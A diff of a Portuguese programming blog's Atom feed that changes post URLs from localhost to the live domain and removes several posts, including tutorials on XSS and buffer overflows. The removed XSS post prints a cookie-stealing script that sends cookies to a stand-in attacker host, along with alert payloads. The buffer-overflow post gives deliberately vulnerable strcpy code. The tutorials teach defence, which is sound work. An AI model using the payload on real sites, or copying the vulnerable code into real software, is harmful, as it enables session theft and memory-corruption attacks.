 Dados comprimidos: <span class="o">[(</span>3, 97<span class="o">)</span>, <span class="o">(</span>1, 32<span class="o">)</span>, <span class="o">(</span>1, 98<span class="o">)</span>, <span class="o">(</span>1, 32<span class="o">)</span>, <span class="o">(</span>1, 99<span class="o">)</span>, <span class="o">(</span>1, 32<span class="o">)</span>, <span class="o">(</span>1, 100<span class="o">)</span>, <span class="o">(</span>1, 32<span class="o">)</span>, <span class="o">(</span>1, 101<span class="o">)</span>, <span class="o">(</span>3, 32<span class="o">)</span>, <span class="o">(</span>1, 102<span class="o">)</span>, <span class="o">(</span>1, 10<span class="o">)]</span>
 Arquivo descomprimido salvo em: t_des.txt
 </code></pre></div></div>
-<p>Note a saida, vemos que isso e um array de tuplas sendo o primeiro indice a quantidade de repetição e o segundo o decimal em ascii. E parabens vc fez seu primeiro algoritmo de compressão de dados.</p>]]></content><author><name></name></author><category term="programação" /><category term="algoritmos" /><category term="logica" /><category term="dados" /><summary type="html"><![CDATA[Olá! Nesse post, vamos explorar os conceitos de compressão de dados, na faculdades de ciencia da computação estudamos que em computadores tudo é um grande “LINGUISÃO DE BITS” que apenas é traduzido por tabelação para caractere, tendo isso em mente vamos entender como funciona o pensamento sobre compressão de dados.]]></summary></entry><entry><title type="html">Introdução à Arquitetura de Computadores: Conceitos e Componentes Fundamentais</title><link href="http://localhost:4000/arquitetura/computadores/hardware/sistemas/2023/05/03/Arquitetura-de-computadores.html" rel="alternate" type="text/html" title="Introdução à Arquitetura de Computadores: Conceitos e Componentes Fundamentais" /><published>2023-05-03T10:10:00-03:00</published><updated>2023-05-03T10:10:00-03:00</updated><id>http://localhost:4000/arquitetura/computadores/hardware/sistemas/2023/05/03/Arquitetura-de-computadores</id><content type="html" xml:base="http://localhost:4000/arquitetura/computadores/hardware/sistemas/2023/05/03/Arquitetura-de-computadores.html"><![CDATA[<p>Olá! Neste post, vamos explorar os conceitos fundamentais da arquitetura de computadores, abordando os principais componentes e suas funções. A arquitetura de computadores é um tema essencial para quem deseja aprofundar seus conhecimentos em ciência da computação e entender como os sistemas computacionais funcionam por trás dos bastidores.</p>
+<p>Note a saida, vemos que isso e um array de tuplas sendo o primeiro indice a quantidade de repetição e o segundo o decimal em ascii. E parabens vc fez seu primeiro algoritmo de compressão de dados.</p>]]></content><author><name></name></author><category term="programação" /><category term="algoritmos" /><category term="logica" /><category term="dados" /><summary type="html"><![CDATA[Olá! Nesse post, vamos explorar os conceitos de compressão de dados, na faculdades de ciencia da computação estudamos que em computadores tudo é um grande “LINGUISÃO DE BITS” que apenas é traduzido por tabelação para caractere, tendo isso em mente vamos entender como funciona o pensamento sobre compressão de dados.]]></summary></entry><entry><title type="html">Introdução à Arquitetura de Computadores: Conceitos e Componentes Fundamentais</title><link href="http://italocobainsblog.com/arquitetura/computadores/hardware/sistemas/2023/05/03/Arquitetura-de-computadores.html" rel="alternate" type="text/html" title="Introdução à Arquitetura de Computadores: Conceitos e Componentes Fundamentais" /><published>2023-05-03T10:10:00-03:00</published><updated>2023-05-03T10:10:00-03:00</updated><id>http://italocobainsblog.com/arquitetura/computadores/hardware/sistemas/2023/05/03/Arquitetura-de-computadores</id><content type="html" xml:base="http://italocobainsblog.com/arquitetura/computadores/hardware/sistemas/2023/05/03/Arquitetura-de-computadores.html"><![CDATA[<p>Olá! Neste post, vamos explorar os conceitos fundamentais da arquitetura de computadores, abordando os principais componentes e suas funções. A arquitetura de computadores é um tema essencial para quem deseja aprofundar seus conhecimentos em ciência da computação e entender como os sistemas computacionais funcionam por trás dos bastidores.</p>
 
 <h2 id="1-cpu-unidade-central-de-processamento">1. CPU (Unidade Central de Processamento)</h2>
 
@@ -340,7 +858,7 @@ Arquivo descomprimido salvo em: t_des.txt
 
 <p>A arquitetura de computadores é um campo fascinante que nos ajuda a compreender o funcionamento dos sistemas computacionais e a forma como seus componentes interagem. Ao estudar arquitetura de computadores, você se tornará mais apto a solucionar problemas, otimizar a performance de sistemas e desenvolver soluções mais eficientes e eficazes.</p>
 
-<p>Aprofundar-se nesse tema também abrirá caminho para explorar áreas relacionadas, como arquiteturas paralelas, sistemas distribuídos e design de hardware. Portanto, invista tempo e esforço no estudo da arquitetura de</p>]]></content><author><name></name></author><category term="Arquitetura" /><category term="Computadores" /><category term="Hardware" /><category term="Sistemas" /><summary type="html"><![CDATA[Olá! Neste post, vamos explorar os conceitos fundamentais da arquitetura de computadores, abordando os principais componentes e suas funções. A arquitetura de computadores é um tema essencial para quem deseja aprofundar seus conhecimentos em ciência da computação e entender como os sistemas computacionais funcionam por trás dos bastidores.]]></summary></entry><entry><title type="html">Melhore a Performance da sua Web em Nível Escalável: Técnicas Criativas e Avançadas</title><link href="http://localhost:4000/desenvolvimento/web/performance/otimiza%C3%A7%C3%A3o/escalabilidade/2023/05/03/Melhore-a-Performance-da-sua-Web.html" rel="alternate" type="text/html" title="Melhore a Performance da sua Web em Nível Escalável: Técnicas Criativas e Avançadas" /><published>2023-05-03T10:00:00-03:00</published><updated>2023-05-03T10:00:00-03:00</updated><id>http://localhost:4000/desenvolvimento/web/performance/otimiza%C3%A7%C3%A3o/escalabilidade/2023/05/03/Melhore-a-Performance-da-sua-Web</id><content type="html" xml:base="http://localhost:4000/desenvolvimento/web/performance/otimiza%C3%A7%C3%A3o/escalabilidade/2023/05/03/Melhore-a-Performance-da-sua-Web.html"><![CDATA[<p>Olá! Neste post, vamos explorar técnicas criativas e avançadas para melhorar a performance de aplicações web, focando em soluções escaláveis que se adaptam a diferentes tamanhos de projetos e demandas. Vamos abordar estratégias para otimizar o carregamento de recursos, aperfeiçoar o tempo de resposta do servidor e proporcionar uma experiência de usuário mais ágil e agradável.</p>
+<p>Aprofundar-se nesse tema também abrirá caminho para explorar áreas relacionadas, como arquiteturas paralelas, sistemas distribuídos e design de hardware. Portanto, invista tempo e esforço no estudo da arquitetura de</p>]]></content><author><name></name></author><category term="Arquitetura" /><category term="Computadores" /><category term="Hardware" /><category term="Sistemas" /><summary type="html"><![CDATA[Olá! Neste post, vamos explorar os conceitos fundamentais da arquitetura de computadores, abordando os principais componentes e suas funções. A arquitetura de computadores é um tema essencial para quem deseja aprofundar seus conhecimentos em ciência da computação e entender como os sistemas computacionais funcionam por trás dos bastidores.]]></summary></entry><entry><title type="html">Melhore a Performance da sua Web em Nível Escalável: Técnicas Criativas e Avançadas</title><link href="http://italocobainsblog.com/desenvolvimento/web/performance/otimiza%C3%A7%C3%A3o/escalabilidade/2023/05/03/Melhore-a-Performance-da-sua-Web.html" rel="alternate" type="text/html" title="Melhore a Performance da sua Web em Nível Escalável: Técnicas Criativas e Avançadas" /><published>2023-05-03T10:00:00-03:00</published><updated>2023-05-03T10:00:00-03:00</updated><id>http://italocobainsblog.com/desenvolvimento/web/performance/otimiza%C3%A7%C3%A3o/escalabilidade/2023/05/03/Melhore-a-Performance-da-sua-Web</id><content type="html" xml:base="http://italocobainsblog.com/desenvolvimento/web/performance/otimiza%C3%A7%C3%A3o/escalabilidade/2023/05/03/Melhore-a-Performance-da-sua-Web.html"><![CDATA[<p>Olá! Neste post, vamos explorar técnicas criativas e avançadas para melhorar a performance de aplicações web, focando em soluções escaláveis que se adaptam a diferentes tamanhos de projetos e demandas. Vamos abordar estratégias para otimizar o carregamento de recursos, aperfeiçoar o tempo de resposta do servidor e proporcionar uma experiência de usuário mais ágil e agradável.</p>
 
 <h2 id="1-priorizar-o-carregamento-de-recursos">1. Priorizar o carregamento de recursos</h2>
 
@@ -387,185 +905,4 @@ Arquivo descomprimido salvo em: t_des.txt
 
 <p>Melhorar a performance da sua aplicação web em nível escalável é um processo contínuo que envolve várias técnicas e abordagens criativas. Ao focar na otimização do carregamento de recursos, adotar arquiteturas escaláveis, utilizar técnicas avançadas de cache e otimizar a entrega de imagens, você estará no caminho certo para criar uma aplicação web rápida e eficiente.</p>
 
-<p>Lembre-se de monitorar a performance da sua aplicação regularmente e ajustar as estratégias conforme necessário. Dessa forma, você garantirá que seus usuários desfrutem de uma experiência agradável e rápida, independentemente do tamanho e das demandas do seu projeto.</p>]]></content><author><name></name></author><category term="Desenvolvimento" /><category term="Web" /><category term="Performance" /><category term="Otimização" /><category term="Escalabilidade" /><summary type="html"><![CDATA[Olá! Neste post, vamos explorar técnicas criativas e avançadas para melhorar a performance de aplicações web, focando em soluções escaláveis que se adaptam a diferentes tamanhos de projetos e demandas. Vamos abordar estratégias para otimizar o carregamento de recursos, aperfeiçoar o tempo de resposta do servidor e proporcionar uma experiência de usuário mais ágil e agradável.]]></summary></entry><entry><title type="html">Entendendo as Diferenças entre MVC e RESTful: Conceitos e Aplicações</title><link href="http://localhost:4000/programa%C3%A7%C3%A3o/arquitetura/mvc/restful/2023/05/03/Entendendo-as-Diferen%C3%A7as-entre-MVC-e-RESTful.html" rel="alternate" type="text/html" title="Entendendo as Diferenças entre MVC e RESTful: Conceitos e Aplicações" /><published>2023-05-03T06:00:08-03:00</published><updated>2023-05-03T06:00:08-03:00</updated><id>http://localhost:4000/programa%C3%A7%C3%A3o/arquitetura/mvc/restful/2023/05/03/Entendendo-as-Diferen%C3%A7as-entre-MVC-e-RESTful</id><content type="html" xml:base="http://localhost:4000/programa%C3%A7%C3%A3o/arquitetura/mvc/restful/2023/05/03/Entendendo-as-Diferen%C3%A7as-entre-MVC-e-RESTful.html"><![CDATA[<p>Olá! Neste post, vamos discutir as diferenças entre os conceitos de <strong>Model-View-Controller (MVC)</strong> e <strong>RESTful</strong>. Ambos são importantes em desenvolvimento de software, especialmente no contexto de aplicações web, mas têm propósitos e funcionalidades diferentes. Vamos aprender sobre cada um deles e como eles são aplicados na prática.</p>
-
-<h2 id="o-que-é-mvc">O que é MVC?</h2>
-
-<p>O Model-View-Controller (MVC) é um padrão de arquitetura de software que separa a lógica de negócio, a apresentação e o controle das aplicações em três componentes distintos:</p>
-
-<ol>
-  <li><strong>Model</strong>: Representa os dados e a lógica de negócio da aplicação. É responsável por armazenar, processar e manipular os dados.</li>
-  <li><strong>View</strong>: É a camada de apresentação responsável por exibir os dados ao usuário. As views recebem informações do model e as apresentam de forma visual.</li>
-  <li><strong>Controller</strong>: Gerencia a comunicação entre a Model e a View. Ele recebe entradas do usuário através da View, processa as solicitações e atualiza o Model e a View de acordo.</li>
-</ol>
-
-<p>O objetivo principal do padrão MVC é separar as responsabilidades e facilitar a manutenção e escalabilidade do projeto.</p>
-
-<h2 id="o-que-é-restful">O que é RESTful?</h2>
-
-<p>RESTful é um conjunto de princípios e práticas para a construção de aplicações web que seguem os princípios da arquitetura REST (Representational State Transfer). As aplicações RESTful são projetadas para funcionar bem com a web, aproveitando os protocolos e convenções existentes, como HTTP e URL.</p>
-
-<p>As principais características das aplicações RESTful incluem:</p>
-
-<ol>
-  <li><strong>Protocolo cliente-servidor</strong>: Separação das responsabilidades entre o cliente (interface do usuário) e o servidor (lógica de negócio e armazenamento de dados), permitindo que ambos evoluam de forma independente.</li>
-  <li><strong>Stateless</strong>: Cada requisição do cliente para o servidor deve conter todas as informações necessárias para entender e processar a solicitação. O servidor não deve armazenar informações sobre o estado do cliente entre as solicitações.</li>
-  <li><strong>Cacheable</strong>: As respostas do servidor podem ser armazenadas em cache no cliente para melhorar o desempenho e a eficiência.</li>
-  <li><strong>Sistema em camadas</strong>: A arquitetura pode ser composta por várias camadas hierárquicas, com cada camada tendo uma responsabilidade específica.</li>
-</ol>
-
-<p>RESTful é frequentemente usado para criar APIs (Application Programming Interfaces) que expõem funcionalidades e dados de aplicações web de maneira padronizada e fácil de usar.</p>
-
-<h2 id="diferenças-entre-mvc-e-restful">Diferenças entre MVC e RESTful</h2>
-
-<p>Embora tanto o MVC quanto o RESTful sejam importantes no desenvolvimento de aplicações web, eles têm propósitos diferentes e não devem ser confundidos. Aqui estão algumas das principais diferenças:</p>
-
-<ol>
-  <li>
-    <p><strong>Propósito</strong>: O MVC é um padrão de arquitetura de software que ajuda a organizar e estruturar a lógica de negócio, a apresentação e o controle da aplicação. Por outro lado, RESTful é uma abordagem para a construção de aplicações web que seguem os princípios da arquitetura REST, focando principalmente na comunicação entre cliente e servidor e na organização das APIs.</p>
-  </li>
-  <li>
-    <p><strong>Componentes</strong>: O MVC é composto por três componentes principais: Model, View e Controller. Já as aplicações RESTful não têm uma estrutura de componentes específica; em vez disso, seguem um conjunto de princípios e práticas para a construção de aplicações web.</p>
-  </li>
-  <li>
-    <p><strong>Aplicação</strong>: O MVC é geralmente usado no desenvolvimento de aplicações web, onde a separação de responsabilidades entre os componentes pode ajudar a simplificar e organizar o código. Por outro lado, RESTful é aplicado principalmente na construção de APIs que expõem funcionalidades e dados de aplicações web de maneira padronizada e fácil de usar.</p>
-  </li>
-  <li>
-    <p><strong>Comunicação</strong>: O MVC lida com a comunicação entre os componentes internos da aplicação (Model, View e Controller), enquanto o RESTful foca na comunicação entre cliente e servidor através de protocolos e convenções da web, como HTTP e URL.</p>
-  </li>
-</ol>
-
-<h2 id="conclusão">Conclusão</h2>
-
-<p>MVC e RESTful são conceitos importantes no desenvolvimento de aplicações web, mas servem a propósitos diferentes e têm diferentes áreas de aplicação. O MVC é um padrão de arquitetura que ajuda a organizar o código e facilita a manutenção e escalabilidade do projeto, enquanto RESTful é uma abordagem para a construção de aplicações web e APIs que seguem os princípios da arquitetura REST.</p>
-
-<p>Entender a diferença entre esses dois conceitos e saber como aplicá-los em seus projetos é fundamental para criar aplicações web eficientes e bem estruturadas.</p>]]></content><author><name></name></author><category term="Programação" /><category term="Arquitetura" /><category term="MVC" /><category term="RESTful" /><summary type="html"><![CDATA[Olá! Neste post, vamos discutir as diferenças entre os conceitos de Model-View-Controller (MVC) e RESTful. Ambos são importantes em desenvolvimento de software, especialmente no contexto de aplicações web, mas têm propósitos e funcionalidades diferentes. Vamos aprender sobre cada um deles e como eles são aplicados na prática.]]></summary></entry><entry><title type="html">Entendendo o XSS (Cross-Site Scripting): Conceitos e Exemplos</title><link href="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/xss/2023/05/02/Entendendo-o-XSS-(Cross-Site-Scripting).html" rel="alternate" type="text/html" title="Entendendo o XSS (Cross-Site Scripting): Conceitos e Exemplos" /><published>2023-05-02T23:48:46-03:00</published><updated>2023-05-02T23:48:46-03:00</updated><id>http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/xss/2023/05/02/Entendendo-o-XSS-(Cross-Site%20Scripting)</id><content type="html" xml:base="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/xss/2023/05/02/Entendendo-o-XSS-(Cross-Site-Scripting).html"><![CDATA[<p>Olá! Neste post, vamos discutir o conceito de <strong>Cross-Site Scripting (XSS)</strong> e ver alguns exemplos que ilustram essa vulnerabilidade comum em aplicações web. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.</p>
-
-<h2 id="o-que-é-xss">O que é XSS?</h2>
-
-<p>Cross-Site Scripting (XSS) é uma vulnerabilidade de segurança que permite que um atacante injete código malicioso, geralmente scripts JavaScript, em páginas web visualizadas por outros usuários. Esses scripts podem acessar informações confidenciais, como cookies e tokens de sessão, ou até mesmo executar ações em nome da vítima.</p>
-
-<h2 id="tipos-de-xss">Tipos de XSS</h2>
-
-<p>Existem três tipos principais de XSS:</p>
-
-<ol>
-  <li><strong>XSS Persistente (Stored XSS)</strong>: Ocorre quando o código malicioso é armazenado permanentemente em um servidor, geralmente em bancos de dados ou arquivos. Quando outros usuários acessam a página afetada, o script é executado em seus navegadores.</li>
-  <li><strong>XSS Refletido (Reflected XSS)</strong>: Ocorre quando o código malicioso é injetado por meio de parâmetros GET ou POST e é imediatamente refletido na resposta do servidor. Geralmente, o atacante induz a vítima a clicar em um link malicioso que contém o código.</li>
-  <li><strong>XSS Baseado em DOM (DOM-Based XSS)</strong>: Ocorre quando o código malicioso é injetado no Document Object Model (DOM) de uma página sem a necessidade de interação com o servidor. Esse tipo de XSS explora falhas no código JavaScript do lado do cliente.</li>
-</ol>
-
-<h2 id="exemplo-de-xss-refletido">Exemplo de XSS Refletido</h2>
-
-<p>Vamos considerar um exemplo simples de XSS Refletido:</p>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
-<span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;head&gt;</span>
-    <span class="nt">&lt;title&gt;</span>Exemplo de XSS Refletido<span class="nt">&lt;/title&gt;</span>
-<span class="nt">&lt;/head&gt;</span>
-<span class="nt">&lt;body&gt;</span>
-    <span class="nt">&lt;h1&gt;</span>Resultado da Pesquisa:<span class="nt">&lt;/h1&gt;</span>
-    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"result"</span><span class="nt">&gt;&lt;/div&gt;</span>
-    <span class="nt">&lt;script&gt;</span>
-        <span class="kd">let</span> <span class="nx">searchQuery</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">q</span><span class="dl">'</span><span class="p">);</span>
-        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Você pesquisou: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">searchQuery</span><span class="p">;</span>
-    <span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
-</code></pre></div></div>
-
-<p>Neste exemplo, o script JavaScript insere o valor do parâmetro <code class="language-plaintext highlighter-rouge">q</code> diretamente no elemento HTML. Se um atacante criar um link como <code class="language-plaintext highlighter-rouge">https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, o script malicioso será executado no navegador do usuário.</p>
-
-<h2 id="exemplo-de-xss-persistente">Exemplo de XSS Persistente</h2>
-
-<p>Suponha que temos um fórum onde os usuários podem postar comentários. Um exemplo de XSS Persistente pode ocorrer se o aplicativo não sanitizar corretamente as entradas dos usuários antes de armazená-las no banco de dados. Um atacante pode enviar um comentário contendo um script malicioso, como:</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Olá</span><span class="p">,</span> <span class="nx">pessoal</span><span class="o">!</span> <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">http://malicious.example.com/steal?cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
-</span></code></pre></div></div>
-
-<p>Quando outros usuários visualizarem esse comentário, o script malicioso será executado em seus navegadores, podendo roubar seus cookies e enviá-los para o site malicioso.</p>
-
-<h2 id="exemplo-de-xss-baseado-em-dom">Exemplo de XSS Baseado em DOM</h2>
-
-<p>Considere o seguinte exemplo de uma página que usa o DOM para exibir o resultado de uma pesquisa:</p>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
-<span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;head&gt;</span>
-    <span class="nt">&lt;title&gt;</span>Exemplo de XSS Baseado em DOM<span class="nt">&lt;/title&gt;</span>
-<span class="nt">&lt;/head&gt;</span>
-<span class="nt">&lt;body&gt;</span>
-    <span class="nt">&lt;h1&gt;</span>Resultado da Pesquisa:<span class="nt">&lt;/h1&gt;</span>
-    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"result"</span><span class="nt">&gt;&lt;/div&gt;</span>
-    <span class="nt">&lt;script&gt;</span>
-        <span class="kd">let</span> <span class="nx">searchQuery</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Você pesquisou: </span><span class="dl">'</span> <span class="o">+</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">searchQuery</span><span class="p">);</span>
-    <span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
-</code></pre></div></div>
-
-<p>Neste exemplo, o script JavaScript lê o valor da pesquisa diretamente do fragmento da URL (parte após o símbolo “#”) e insere-o no elemento HTML. Se um atacante criar um link como https://example.com/search#<script>alert('XSS')</script>, o navegador da vítima executará o script malicioso ao acessar o link.</p>
-
-<h2 id="conclusão">Conclusão</h2>
-
-<p>O Cross-Site Scripting (XSS) é uma das vulnerabilidades mais comuns em aplicações web. Para proteger seu site contra ataques de XSS, é importante seguir boas práticas de segurança, como a sanitização adequada das entradas dos usuários e a validação das entradas do lado do cliente e do servidor.</p>
-
-<p>Também é essencial usar políticas de segurança de conteúdo (Content Security Policy - CSP) para limitar a execução de scripts de origens não confiáveis e impedir a exploração de vulnerabilidades XSS. Além disso, é importante manter-se atualizado sobre as últimas tendências e técnicas de ataque para garantir a segurança contínua de sua aplicação web.</p>
-
-<p>Ao adotar essas práticas e conscientizar-se das diferentes formas de XSS, como XSS Persistente, XSS Refletido e XSS Baseado em DOM, você estará mais bem preparado para identificar e mitigar possíveis vulnerabilidades em seu site ou aplicação web.</p>]]></content><author><name></name></author><category term="Segurança" /><category term="Programação" /><category term="Vulnerabilidades" /><category term="XSS" /><summary type="html"><![CDATA[Olá! Neste post, vamos discutir o conceito de Cross-Site Scripting (XSS) e ver alguns exemplos que ilustram essa vulnerabilidade comum em aplicações web. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.]]></summary></entry><entry><title type="html">Entendendo o Buffer Overflow: Conceitos e Exemplos</title><link href="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/bufferoverflow/2023/05/02/Entendendo-o-Buffer-Overflow.html" rel="alternate" type="text/html" title="Entendendo o Buffer Overflow: Conceitos e Exemplos" /><published>2023-05-02T22:48:46-03:00</published><updated>2023-05-02T22:48:46-03:00</updated><id>http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/bufferoverflow/2023/05/02/Entendendo-o-Buffer-Overflow</id><content type="html" xml:base="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/bufferoverflow/2023/05/02/Entendendo-o-Buffer-Overflow.html"><![CDATA[<p>Olá! Neste post, vamos discutir o conceito de <strong>buffer overflow</strong> e ver alguns exemplos que ilustram essa vulnerabilidade comum em programas de computador. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.</p>
-
-<h2 id="o-que-é-buffer-overflow">O que é Buffer Overflow?</h2>
-
-<p>Buffer overflow é uma vulnerabilidade que ocorre quando um programa tenta escrever mais dados em um buffer do que ele foi projetado para armazenar. Isso pode resultar em comportamento imprevisível, como a corrupção de dados adjacentes na memória, travamento do programa ou, em casos mais sérios, a execução de código malicioso.</p>
-
-<h2 id="por-que-isso-acontece">Por que isso acontece?</h2>
-
-<p>Muitas vezes, buffer overflows ocorrem devido à falta de validação de entrada ou ao uso de funções inseguras que não verificam o tamanho do buffer. Linguagens de programação de baixo nível, como C e C++, são particularmente vulneráveis a buffer overflows, pois não possuem verificações automáticas de limites de buffer.</p>
-
-<h2 id="exemplo-de-buffer-overflow">Exemplo de Buffer Overflow</h2>
-
-<p>Vamos analisar um exemplo simples de buffer overflow em C:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span>
-<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"Uso: %s &lt;input_string&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="n">vulnerable_function</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>Neste exemplo, a função <code class="language-plaintext highlighter-rouge">vulnerable_function</code> usa a função <code class="language-plaintext highlighter-rouge">strcpy</code> para copiar a string de entrada para um buffer de tamanho fixo. No entanto, <code class="language-plaintext highlighter-rouge">strcpy</code> não verifica o tamanho do buffer e pode causar um overflow se a string de entrada for maior que o tamanho do buffer.</p>
-
-<h2 id="como-explorar-e-evitar-buffer-overflows">Como explorar e evitar Buffer Overflows</h2>
-
-<p>Os atacantes podem explorar buffer overflows para injetar e executar código malicioso, causar a negação de serviço ou ganhar acesso não autorizado a sistemas. Existem várias técnicas para explorar buffer overflows, como o <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">Return-to-libc</a> e o <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP (Return-oriented programming)</a>.</p>
-
-<p>Para evitar buffer overflows, os desenvolvedores podem adotar as seguintes práticas:</p>
-
-<ol>
-  <li><strong>Validar a entrada do usuário</strong>: Sempre valide o tamanho e o conteúdo das entradas do usuário antes de processá-las.</li>
-  <li><strong>Usar funções seguras</strong>: Evite usar funções inseguras que não verificam o tamanho do buffer, como <code class="language-plaintext highlighter-rouge">strcpy</code>, <code class="language-plaintext highlighter-rouge">gets</code> e <code class="language-plaintext highlighter-rouge">sprintf</code>. Em vez disso, use funções seguras, como <code class="language-plaintext highlighter-rouge">strncpy</code>, <code class="language-plaintext highlighter-rouge">fgets</code> e <code class="language-plaintext highlighter-rouge">snprintf</code>.</li>
-  <li><strong>Habilitar proteções de compilador</strong>: Ative proteções como <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR (Address Space Layout Randomization)</a> e <a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP (Data Execution Prevention)</a> para dificultar a exploração de buffer overflows.</li>
-</ol>
-
-<p>Espero que este post tenha ajudado a entender melhor o conceito de buffer overflow, suas causas e como evitá-lo. Ao seguir as práticas recomendadas, você pode minimizar as chances de introduzir vulnerabilidades de buffer overflow em seu código e proteger seus programas contra ataques maliciosos.</p>]]></content><author><name></name></author><category term="Segurança" /><category term="Programação" /><category term="Vulnerabilidades" /><category term="BufferOverflow" /><summary type="html"><![CDATA[Olá! Neste post, vamos discutir o conceito de buffer overflow e ver alguns exemplos que ilustram essa vulnerabilidade comum em programas de computador. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.]]></summary></entry><entry><title type="html">Bem vindo ao blog do ItaloCobains</title><link href="http://localhost:4000/programa%C3%A7%C3%A3o/inicio/web/baixo/nivel/2023/05/02/Bem-vindo-ao-blog-do-ItaloCobains.html" rel="alternate" type="text/html" title="Bem vindo ao blog do ItaloCobains" /><published>2023-05-02T21:48:46-03:00</published><updated>2023-05-02T21:48:46-03:00</updated><id>http://localhost:4000/programa%C3%A7%C3%A3o/inicio/web/baixo/nivel/2023/05/02/Bem-vindo-ao-blog-do-ItaloCobains</id><content type="html" xml:base="http://localhost:4000/programa%C3%A7%C3%A3o/inicio/web/baixo/nivel/2023/05/02/Bem-vindo-ao-blog-do-ItaloCobains.html"><![CDATA[<p>Olá! Meu nome é <strong>Italo Brito Brandão</strong>, mas sou mais conhecido na comunidade como <em>ItaloCobains</em>. Comecei a aprender a programar aos 16 anos, usando o Visualg. Sempre gostei de criar algoritmos e enfrentar desafios. Depois de um tempo, comecei a aprender sobre desenvolvimento web, estudando HTML e CSS, o que me proporcionou uma base sólida para aprender frameworks mais adiante.</p>
-
-<p>Embora o próximo passo lógico fosse aprender JavaScript, decidi mudar um pouco e aprender uma linguagem de programação consolidada: Python. Após um ano programando em Python, busquei algo mais desafiador e mergulhei no mundo da linguagem C. Foi um processo difícil, e cheguei a odiar a linguagem C por um tempo. No entanto, conforme fui aprendendo mais sobre ciência da computação, a linguagem C começou a fazer sentido para mim.</p>
-
